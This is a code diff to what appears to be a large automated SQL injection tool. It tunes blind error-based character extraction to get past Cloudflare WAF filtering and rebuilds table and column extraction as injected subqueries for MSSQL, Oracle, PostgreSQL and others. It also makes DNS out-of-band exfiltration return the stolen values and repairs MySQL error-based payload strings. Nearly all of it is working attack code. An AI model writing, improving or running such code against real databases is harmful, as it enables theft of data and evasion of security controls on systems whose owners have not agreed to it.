@@ -136166,15 +136166,22 @@ class SideChannelExtractor:
                 # sanity (1>0/1>2) — they are known to fail. If BYTEA mode has not yet
                 # been verified for this extractor instance, run 2 verification probes
                 # before trusting extraction results. threshold=33 ('!') should be True
-                # for any non-empty string; threshold=65534 should be False for all real
-                # SQL values. If BYTEA probes are also blocked, abort immediately rather
+                # for any non-empty string; threshold=127 (DEL, decode('7f','hex')) should
+                # be False for all real SQL identifiers (none start with the DEL control
+                # character). If BYTEA probes are also blocked, abort immediately rather
                 # than producing garbage codepoints.
                 if not self._we_bytea_ok:
                     _bv_true = await self.eval_where_error(
                         self._char_ord_cond(expr, 1, 33, True),
                         random.randint(100000, 999999))
+                    # BUG-BYTEA-FALSE-PROBE-FIX: threshold=65534 (U+FFFE) encodes to 3-byte
+                    # UTF-8 (ef bf be) which Cloudflare blocks as a suspicious byte pattern,
+                    # making _bv_false=True (nearest to err_len) even when BYTEA mode works.
+                    # Use threshold=127 (DEL, 1-byte UTF-8 '7f') — no real SQL identifier
+                    # starts with the DEL control character, so this reliably returns False
+                    # for any valid expression, and the 1-byte hex is never WAF-blocked.
                     _bv_false = await self.eval_where_error(
-                        self._char_ord_cond(expr, 1, 65534, True),
+                        self._char_ord_cond(expr, 1, 127, True),
                         random.randint(100000, 999999))
                     if _bv_true is True and _bv_false is False:
                         self._we_bytea_ok = True
@@ -136236,13 +136243,16 @@ class SideChannelExtractor:
                         # functions AND BYTEA comparison syntax would cause all binary search
                         # probes to return the same (blocked) result → all-True convergence to
                         # garbage codepoints. Probe at threshold=33 (expected True: char >= '!'
-                        # for any non-empty real SQL value) and threshold=65534 (expected False:
-                        # no real SQL value contains a char at U+FFFE). Abort if BYTEA also fails.
+                        # for any non-empty real SQL value) and threshold=127 (expected False:
+                        # no real SQL identifier starts with the DEL control character U+007F,
+                        # and decode('7f','hex') is a 1-byte hex that WAFs never block — unlike
+                        # the previous 65534 threshold which produced 3-byte UTF-8 ef bf be that
+                        # Cloudflare blocked, making _bv_false=True and incorrectly aborting).
                         _bv_true = await self.eval_where_error(
                             self._char_ord_cond(expr, 1, 33, True),
                             random.randint(100000, 999999))
                         _bv_false = await self.eval_where_error(
-                            self._char_ord_cond(expr, 1, 65534, True),
+                            self._char_ord_cond(expr, 1, 127, True),
                             random.randint(100000, 999999))
                         if _bv_true is True and _bv_false is False:
                             self._we_bytea_ok = True
@@ -136259,8 +136269,8 @@ class SideChannelExtractor:
                         # (30+ requests). The oracle IS valid but the WAF rate window hasn't
                         # reset yet. A brief cooldown allows the rate limiter to recover.
                         # Try BYTEA probes after 15s: threshold=33 ('!') uses decode('21','hex')
-                        # and threshold=65534 uses decode('efbfbe','hex') — 1-3 byte hex
-                        # patterns less likely to trigger pattern-match than 4-byte sequences.
+                        # and threshold=127 (DEL) uses decode('7f','hex') — both 1-byte hex
+                        # sequences that WAFs never block. No real identifier starts with DEL.
                         # If BYTEA verification passes, proceed in WAF-bypass ordinal mode.
                         print(f"[SideChannel] Oracle sanity FAILED "
                               f"(primary: 1>0→{_san_true}, 1>2→{_san_false}; "
@@ -136274,7 +136284,7 @@ class SideChannelExtractor:
                             random.randint(100000, 999999))
                         await asyncio.sleep(1.0)
                         _bv2_false = await self.eval_where_error(
-                            self._char_ord_cond(expr, 1, 65534, True),
+                            self._char_ord_cond(expr, 1, 127, True),
                             random.randint(100000, 999999))
                         if _bv2_true is True and _bv2_false is False:
                             print(f"[SideChannel] BYTEA sanity OK after cooldown — "
@@ -136465,137 +136475,35 @@ class SideChannelExtractor:
 
     async def extract_table_column(self, table, column, offset=0, max_len=64):
         """Extract a column value using FROM-based error (avoids subqueries).
-        Uses: SELECT 1/0 FROM table WHERE col >= $$test$$ LIMIT 1 OFFSET N
-        The WHERE controls both the error trigger AND the comparison."""
+        Delegates to extract_where_error() with a scalar subquery expression so
+        the column name is always in scope regardless of injection strategy."""
         if not self._error_strategy:
             return ""
 
         print(f"[SideChannel] Table extract: {table}.{column}[{offset}]", flush=True)
-        prefix = ""
-        # BUG-SCE-TCCEIL-FIX: same per-DBMS ceiling fix as extract_where_error.
-        # BUG-SCE-TC-PG-CEIL-FIX: add PostgreSQL-family and MySQL-family to 1114111 group.
-        _sce_tc_char_hi = (65535 if self.dbms in ("MSSQL", "Sybase", "Oracle")
-                           else 1114111 if self.dbms in (
-                               "SQLite", "PostgreSQL", "CockroachDB", "YugabyteDB",
-                               "Amazon Redshift", "MySQL", "MariaDB", "TiDB")
-                           else 255)
-        # BUG-SCE-BYTEA-BSEARCH-CEILING (extract_table_column): same root cause as
-        # extract_where_error. BYTEA hex encoding of thresholds above 127 produces
-        # 2–4 byte UTF-8 patterns (e.g. decode('f2888197','hex')) that WAFs block,
-        # returning err_len-sized pages → eval_where_error returns True for every
-        # high-threshold probe → binary search converges to garbage Unicode. All
-        # SQL column values extracted via this path (table names, column names,
-        # data values in schema enum) are ASCII identifiers ≤ 127. Cap at 127.
-        if self._we_ordinal_blocked:
-            _sce_tc_char_hi = 127
-        # BUG-SCE-EXTTBLCOL-LO-INIT FIX (v66): same space-streak EOS fix as extract_where_error.
-        _sce_tc_space_streak = 0
-        # BUG-SCE-EXTTBLCOL-NO-CONSECUTIVE-FAIL FIX (MEDIUM, all 5 DBMSes, WHERE-ERROR
-        # table-column extraction path):
-        # extract_where_error() has a _consecutive_fail counter that aborts after 3
-        # consecutive None returns from eval_where_error() (scan stopped / oracle dead).
-        # extract_table_column() was missing this guard: when the oracle is dead, the
-        # `else: await asyncio.sleep(2.0); continue` path loops for ALL max_len positions
-        # (default 64), sleeping 2s each = 128 seconds of wasted time per call before
-        # returning "".  Fix: add the same _consecutive_fail counter and abort at >= 3,
-        # mirroring extract_where_error's BUG-SCE-WE-CONSECUTIVE-FAIL-DEAD FIX.
-        _sce_tc_consecutive_fail = 0
-        for pos in range(1, max_len + 1):
-            lo, hi = 32, _sce_tc_char_hi
-            # BUG-ICU-COLLATION-FIX (CRITICAL): Use ordinal-based comparison for locale
-            # independence. String comparison is ICU-locale-sensitive in PostgreSQL
-            # (en_US.UTF-8 ICU makes letters sort after punctuation), causing garbage
-            # Unicode codepoints. Ordinal functions (ASCII/ORD/UNICODE) return the
-            # actual codepoint value regardless of collation settings.
-            # BUG-WE-ORDINAL-WAF-BLOCK FIX: propagate WAF-bypass mode (set by
-            # extract_where_error sanity check) to all ordinal conditions here.
-            _tc_bypass = self._we_ordinal_blocked
-            # BUG-TC-BSEARCH-CDN-NONCE FIX: same CDN nonce fix as extract_where_error.
-            # Every eval_where_error call needs a unique URL nonce to prevent CDN from
-            # serving the same cached response for all binary search probes in a position.
-            _above_a = await self.eval_where_error(self._char_ord_cond(column, pos, 97, _tc_bypass),
-                                                   random.randint(100000, 999999))
-            if _above_a is True:
-                _sce_tc_consecutive_fail = 0  # reset on non-None result
-                _above_z = await self.eval_where_error(self._char_ord_cond(column, pos, 123, _tc_bypass),
-                                                       random.randint(100000, 999999))
-                await asyncio.sleep(0.2)
-                if _above_z is None:
-                    lo, hi = 97, _sce_tc_char_hi  # probe failed; keep full upper range
-                elif not _above_z:
-                    lo, hi = 97, 122              # confirmed: char ordinal in [97,122] (a-z)
-                else:
-                    # BUG-TC-STUCK-ORACLE-COARSE FIX: same stuck-oracle detection as
-                    # extract_where_error. Oracle claimed char >= ord('a') AND >= ord('{').
-                    # Probe at ceiling-1 to detect uniformly-True (WAF/CDN artifact) oracle.
-                    _tc_stuck_probe = await self.eval_where_error(
-                        self._char_ord_cond(column, pos, _sce_tc_char_hi - 1, _tc_bypass),
-                        random.randint(100000, 999999))
-                    if _tc_stuck_probe is True:
-                        _bsearch_converged = False
-                        lo = hi = _sce_tc_char_hi  # force guard to break
-                    else:
-                        lo, hi = 123, _sce_tc_char_hi  # above lowercase: {|}~, Latin-1 128+, Unicode
-            elif _above_a is False:
-                _sce_tc_consecutive_fail = 0  # reset on non-None result
-                lo, hi = 32, 96
-            else:
-                # _above_a is None: oracle returned ambiguous result
-                _sce_tc_consecutive_fail += 1
-                # BUG-SCE-EXTTBLCOL-NO-CONSECUTIVE-FAIL FIX: abort after 3 consecutive
-                # None results to prevent 128s wasted time on dead oracle.
-                if _sce_tc_consecutive_fail >= 3:
-                    LOG.debug(
-                        "[SideChannel/extract_table_column] Oracle returned None %d consecutive "
-                        "times — aborting (scan stopped or oracle unreachable)",
-                        _sce_tc_consecutive_fail)
-                    return prefix
-                await asyncio.sleep(2.0)
-                continue
-            await asyncio.sleep(0.3)
+        # BUG-ETC-COLUMN-SCOPE (CRITICAL): The old binary search loop passed `column`
+        # (a bare name like "flag") directly to _char_ord_cond, which wrapped it in
+        # RIGHT(LEFT((flag),pos),1)::BYTEA >= decode('hex','hex').  _build_error_cond
+        # then placed this into a standalone SELECT without a FROM clause:
+        #   '; SELECT 1/((RIGHT(LEFT((flag),1),1)::BYTEA >= ...)::int - 1)-- -
+        # PostgreSQL raises "column flag does not exist" (ERROR 42703) for every probe
+        # — not a division-by-zero. When all queries error identically, eval_where_error
+        # returns True for all binary search probes → lo converges to _sce_tc_char_hi=127
+        # → stuck-oracle guard breaks → extract_table_column always returns "".
+        # Fix: build a scalar subquery that includes the FROM clause so the column IS in
+        # scope. Delegate the entire binary search to extract_where_error() which already
+        # has all the correct logic (BYTEA mode, CDN nonces, stuck-oracle guards, etc.).
+        if self.dbms in ("MSSQL", "Sybase"):
+            expr = (f"(SELECT {column} FROM {table} ORDER BY (SELECT NULL) "
+                    f"OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY)")
+        elif self.dbms == "Oracle":
+            expr = (f"(SELECT {column} FROM "
+                    f"(SELECT {column},ROWNUM _r FROM {table}) WHERE _r={offset+1})")
+        else:
+            expr = f"(SELECT {column} FROM {table} LIMIT 1 OFFSET {offset})"
+        return await self.extract_where_error(expr, max_len=max_len)
 
-            # Binary search using ordinal comparison (locale-independent).
-            # BUG-SCE-EXTTBLCOL-BSEARCH-UNCONVERGED FIX: add _bsearch_converged flag
-            # to prevent emitting chr(lo) when the search was interrupted before lo==hi.
-            # BUG-TC-STUCK-ORACLE-BSEARCH FIX: track whether any probe returned False.
-            # Stuck-True oracle makes all probes True → lo converges to ceiling = garbage.
-            _bsearch_converged = True
-            _had_false_result = False
-            while lo < hi:
-                mid = _randomized_mid(lo, hi)
-                cond = self._char_ord_cond(column, pos, mid + 1, _tc_bypass)
-                _tc_bs_nonce = random.randint(100000, 999999)
-                result = await self.eval_where_error(cond, _tc_bs_nonce)
-                if result is None:
-                    await asyncio.sleep(2.0)
-                    result = await self.eval_where_error(cond, random.randint(100000, 999999))
-                if result is None:
-                    _bsearch_converged = False  # lo is not reliable; do not emit chr(lo)
-                    break
-                if result:
-                    lo = mid + 1
-                else:
-                    hi = mid
-                    _had_false_result = True
-                await asyncio.sleep(0.3)
-
-            if (lo < 32 or lo > _sce_tc_char_hi or not _bsearch_converged
-                    or (not _had_false_result and lo > 127)):
-                break
-            ch = chr(lo)
-            # BUG-SCE-EXTTBLCOL-LO-INIT FIX (v66): space-streak EOS detection.
-            if ch == ' ':
-                _sce_tc_space_streak += 1
-                if _sce_tc_space_streak >= 3:
-                    prefix = prefix.rstrip(' ')
-                    break
-            else:
-                _sce_tc_space_streak = 0
-            prefix += ch
-            print(f"[SideChannel] pos={pos}  {ch!r}  result={prefix!r}  [{self._req_count} reqs]", flush=True)
-        return prefix
-
-    # 
+    #
     # CHANNEL 2: DNS OOB  Full extraction in one request
     # Enhanced: multiple methods per DBMS, HTTP fallback, chunking,
     # tamper chain applied, verification probe.
@@ -168194,10 +168102,17 @@ class DNSExfilExtractor:
             return {}
         results = {}
         for label, expr in queries.items():
-            sent = await self.extract_value(expr)
-            if sent:
-                results[label] = f"[DNS exfil sent to {self._oob_domain}]"
-                print(f"[+] [DNSExfil] {label}: probe sent", flush=True)
+            # BUG-DNSEXFIL-DISCARD-VALUE FIX (HIGH, all DBMSes, OOB extraction):
+            # extract_value() returns the decoded DNS-exfiltrated string (e.g. "5.7.33-log")
+            # or None on failure.  The old code stored f"[DNS exfil sent to ...]" instead
+            # of the actual decoded value — discarding all extracted data and storing a
+            # useless placeholder.  Downstream callers (schema enumeration, report output)
+            # received the placeholder string as the "extracted" database version/user/etc.
+            # Fix: store the returned value directly; keep the print for operator feedback.
+            _val = await self.extract_value(expr)
+            if _val:
+                results[label] = _val
+                print(f"[+] [DNSExfil] {label}: {_val!r}", flush=True)
         return results
 
 
@@ -170196,9 +170111,14 @@ class ScannerVFinal(ScannerV15):
                     engine, cfg, cfg.method, url, cfg.data, _ctx_data_fmt, baseline, [])
                 contexts = {}
                 # Limit to first 2 params for speed; sweep rest lazily during scan
+                # BUG-CTXSWEEP-LIST-ORIGINAL FIX: parse_qs returns dict[str, list[str]].
+                # Passing the list directly to sweep() caused `original + true_sfx`
+                # (list + str) to raise TypeError on every probe → all contexts returned
+                # "UNKNOWN" silently. Extract the first string value.
                 _sweep_tasks = []
                 for param, original in list(params.items())[:2]:
-                    _sweep_tasks.append((param, original, sweeper.sweep(param, original)))
+                    _orig_str = original[0] if isinstance(original, list) else original
+                    _sweep_tasks.append((param, _orig_str, sweeper.sweep(param, _orig_str)))
                 for param, original, task in _sweep_tasks:
                     try:
                         ctx = await asyncio.wait_for(task, timeout=15)
@@ -171418,7 +171338,8 @@ MYSQL_ERROR_PAYLOADS = [
     "JSON_CONTAINS('a',CAST((SELECT COUNT(*) FROM information_schema.TABLES) AS JSON))",
     "JSON_CONTAINS('a',CAST((SELECT PLUGIN_NAME FROM information_schema.PLUGINS LIMIT 1) AS JSON))",
     "JSON_CONTAINS('a',CAST((SELECT FILE_NAME FROM information_schema.FILES LIMIT 1) AS JSON))",
-    "JSON_CONTAINS('a'ST_CONTAINS(POINT(1,1),POINT(CAST(USER() AS DECIMAL),1))",
+    "JSON_CONTAINS('a',CAST((SELECT USER()) AS JSON))",
+    'ST_CONTAINS(POINT(1,1),POINT(CAST(USER() AS DECIMAL),1))',
     'ST_CONTAINS(POINT(1,1),POINT(CAST(DATABASE() AS DECIMAL),1))',
     'ST_CONTAINS(POINT(1,1),POINT(CAST(SCHEMA() AS DECIMAL),1))',
     'ST_CONTAINS(POINT(1,1),POINT(CAST(VERSION() AS DECIMAL),1))',
